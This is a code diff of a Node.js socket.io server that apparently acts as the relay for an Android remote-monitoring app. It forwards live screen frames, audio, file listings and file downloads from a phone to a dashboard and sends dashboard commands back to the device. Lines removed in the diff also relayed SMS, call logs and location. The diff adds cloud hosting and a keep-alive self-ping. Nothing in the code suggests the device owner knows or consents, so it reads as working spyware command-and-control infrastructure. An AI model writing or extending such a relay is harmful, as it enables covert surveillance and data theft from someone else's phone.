@@ -1,57 +1,79 @@
+const express = require('express');
 const http = require('http');
+const https = require('https');
 const { Server } = require('socket.io');
 
-const server = http.createServer();
+const app = express();
+const server = http.createServer(app);
+
+// 1. CONFIGURATION
+const PORT = process.env.PORT || 3000;
+// REPLACE THIS with your actual Render URL once deployed
+const RENDER_EXTERNAL_URL = "https://your-app-name.onrender.com"; 
+
+// 2. MIDDLEWARE & HEALTH CHECK
+// This prevents the "Port scan timeout" error on Render
+app.get('/', (req, res) => {
+    res.send('Server is Online and Awake');
+});
+
+// 3. SOCKET.IO SETUP
 const io = new Server(server, {
     cors: {
-        origin: "*", // Allows your HTML dashboard to connect from any source
+        origin: "*",
         methods: ["GET", "POST"]
     },
-    maxHttpBufferSize: 1e7 // Increases buffer size to 10MB for high-res screen frames
+    // Increased to 20MB to handle high-quality screen frames and file transfers
+    maxHttpBufferSize: 2e7 
 });
 
+// 4. SOCKET EVENT HANDLING
 io.on('connection', (socket) => {
+    console.log(`Connected: ${socket.id}`);
+
+    // Receive Screen Stream from Android and broadcast to Dashboard
+    socket.on('data-stream', (data) => {
+        socket.broadcast.emit('data-stream', data);
+    });
+
+    // Receive Audio Stream
+    socket.on('audio-stream', (data) => {
+        socket.broadcast.emit('audio-stream', data);
+    });
+
+    // File Explorer: List files
     socket.on('file-list', (data) => {
-    socket.broadcast.emit('file-list', data);
-});
-
-socket.on('file-download', (data) => {
-    socket.broadcast.emit('file-download', data);
-});
-    console.log('New connection:', socket.id);
-
-    // 1. RECEIVE DATA FROM ANDROID
-    // Screen frames
-    socket.on('data-stream', (base64Data) => {
-        // Broadcast to all connected dashboards
-        socket.broadcast.emit('data-stream', base64Data);
+        socket.broadcast.emit('file-list', data);
     });
 
-    // Audio chunks
-    socket.on('audio-stream', (audioBase64) => {
-        socket.broadcast.emit('audio-stream', audioBase64);
+    // File Explorer: Download data
+    socket.on('file-download', (data) => {
+        socket.broadcast.emit('file-download', data);
     });
 
-    // SMS/Call Logs/Location
-    socket.on('device-data', (payload) => {
-        socket.broadcast.emit('device-data', payload);
-    });
-
-    // 2. RECEIVE COMMANDS FROM DASHBOARD
+    // Forward commands from Dashboard to Android Device
     socket.on('command', (cmd) => {
-        console.log('Sending command to device:', cmd);
-        // This sends the command (e.g., 'start-audio') to the Android app
+        console.log(`Command sent: ${cmd}`);
         socket.broadcast.emit('command', cmd);
     });
 
     socket.on('disconnect', () => {
-        console.log('User disconnected:', socket.id);
+        console.log(`Disconnected: ${socket.id}`);
     });
 });
 
-const PORT = 3000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log(`Your Dashboard IP is: http://YOUR_LOCAL_IP:${PORT}`);
-});
+// 5. KEEP-ALIVE SELF-PING (Every 10 minutes)
+setInterval(() => {
+    if (RENDER_EXTERNAL_URL.includes("onrender.com")) {
+        https.get(RENDER_EXTERNAL_URL, (res) => {
+            console.log(`Self-Ping Status: ${res.statusCode}`);
+        }).on('error', (err) => {
+            console.error(`Self-Ping Error: ${err.message}`);
+        });
+    }
+}, 600000); // 600,000ms = 10 minutes
 
+// 6. START SERVER
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server is running on port: ${PORT}`);
+});
